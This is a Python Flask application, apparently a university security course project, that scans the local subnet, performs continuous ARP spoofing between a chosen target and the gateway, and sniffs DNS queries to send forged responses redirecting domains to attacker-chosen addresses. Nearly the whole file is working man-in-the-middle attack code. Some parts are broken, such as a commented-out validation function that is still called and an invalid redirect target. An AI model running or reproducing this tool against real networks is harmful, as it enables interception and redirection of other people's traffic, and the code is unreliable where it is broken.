from flask import Flask, request, render_template, redirect, url_for
from scapy.all import *
import scapy.all as scapy
import concurrent.futures
import ipaddress
import netifaces
import platform
import socket
import os
import sys
from threading import Event
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
app = Flask(__name__)

colors = {'HEADER' : "\033[95m",
    'OKBLUE' : "\033[94m",
    'RED' : "\033[91m",
    'OKYELLOW' : "\033[93m",
    'GREEN' : "\033[92m",
    'LIGHTBLUE' : "\033[96m",
    'WARNING' : "\033[93m",
    'FAIL' : "\033[91m",
    'ENDC' : "\033[0m",
    'BOLD' : "\033[1m",
    'UNDERLINE' : "\033[4m" }

gateways = netifaces.gateways()
gateway_ip = gateways['default'][netifaces.AF_INET][0]

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
target_ip = None

# Initialize the IP dictionary
ip_dict = {}
stop_event = Event()


@app.route('/stop_activity', methods=['POST'])
def stop_activity():
    global stop_event
    if stop_event is not None:
        stop_event.set()
    return redirect('/')


@app.route('/refresh_ip_dict', methods=['GET'])
def refresh_ip_dict():
    return redirect('/')


# ARP spoofing
##################################################################
def ping_ip(ip):
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['ping', '-n', '1', '-w', '100', ip], capture_output=True)
        else:
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], capture_output=True)

        if result.returncode == 0:
            return ip
    except Exception:
        pass


def get_active_ips(ip_address):
    network = ipaddress.ip_interface(ip_address + '/24')
    network_range = network.network
    active_ips = set()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        ip_list = [str(ip) for ip in network_range.hosts()]
        results = executor.map(ping_ip, ip_list)
        active_ips = set(filter(None, results))

    active_ips.discard(gateway_ip)
    active_ips.discard(local_ip)
    return active_ips


# def get_mac(ip):
#     arp_request = scapy.ARP(pdst=ip)
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     arp_request_broadcast = broadcast / arp_request
#     answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
#     return answered_list[0][1].hwsrc
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


@app.route('/', methods=['GET'])
def home():
    active_ips = get_active_ips(gateway_ip)
    sorted_network_range = sorted(active_ips)

    # Perform IP scan after spoofing
    if stop_event is not None and stop_event.is_set():
        active_ips = get_active_ips(gateway_ip)
        sorted_network_range = sorted(active_ips)
        stop_event.clear()

    return render_template('index.html', gateway_ip=gateway_ip, network_range=sorted_network_range)


@app.route('/spoof', methods=['POST'])
def spoof_ip():
    target_ip = request.form.get('target_ip')
  

    try:
        sent_packets_count = 0
        if get_mac(target_ip) is None or get_mac(gateway_ip) is None:
            error_message = f"No response from IP: {target_ip if get_mac(target_ip) is None else gateway_ip}"
            return render_template('index.html', error_message=error_message)
        else:
            global stop_event
            
            stop_event = Event()
            while not stop_event.is_set():
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
                time.sleep(2)  # Wait for two seconds
            print("\n[*] Arp Spoof Stopped")
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")

    return redirect(url_for('home'))

#DNS spoofing
#############################################################



# #Checks if an IP passed as arg is a valid IP address
# def valid_ip(address):
#     try: 
#         socket.inet_aton(address)
#         return True
#     except:
#         return False

path = "C:\\Users\\20211117\\Documents\\GitHub\\2IC80-Final-project\\Kris\\Kris\\myfile.txt"

sniff_filter = 'udp dst port 53'
registers = {}
all_pkt = True
def read_file(path):
        if os.path.isfile(path) and os.stat(path).st_size > 0:
            file = open(path, "r")
            for line in file:
                if line not in ['\n', '\r\n']:
                    try:
                        key, value = line.split()
                        registers[key] = value
                        if not valid_ip(value):
                            sys.exit(1)
                    except:
                        sys.exit(1)
            file.close()
        else:
            sys.exit(1)

# Checks if all hosts are spoofed or not
def check_victims(pkt):
    if all_pkt and IP in pkt:
        result = True
    elif IP in pkt:
        result = (pkt[IP].src == target_ip)
    else:
        result = False
    return result


# Checks if a packet is a valid DNS query and sends a spoofed response
def fake_dns_response(pkt):
    
    result = check_victims(pkt)
    if (result and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2] in registers):
        cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
        fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]) / DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]))
        send(fakeResponse, verbose=0)
        print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+pkt[IP].src+"]"+colors['WARNING']+": Redirecting "+colors['ENDC']+"["+cap_domain+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+registers[cap_domain]+"]")

#Starts sniffing
def start_sniffing():
    sniff(filter=sniff_filter, prn=fake_dns_response, store=0)
    
#Starts the DNS spoofing
def start_dns_spoofing():
    read_file(path)
    start_sniffing()
    print("DNS spoofing activated")



#when use presses dns spoof button make start the prosses of dns spoofing
@app.route("/dns_spoof", methods=['POST'])
def dnsSpoof():
    target_ip = request.form.get('target_ip')
    stop_event = False
    if not stop_event :
        print("DNS spoofing activated")  # Print statement when DNS spoofing starts

        start_dns_spoofing()
        
    else:
        print("DNS spoofing stopped. 3")

    # if check_dns_spoofed(target_ip):
    #     print("Target IP is DNS spoofed")
    #     return redirect(url_for('home'))

    return redirect(url_for(''))


if __name__ == '__main__':
    #when the app is runned it will start the scan_network function
    app.run(debug=True)
    active_ips = get_active_ips(gateway_ip)
    sorted_network_range = sorted(active_ips)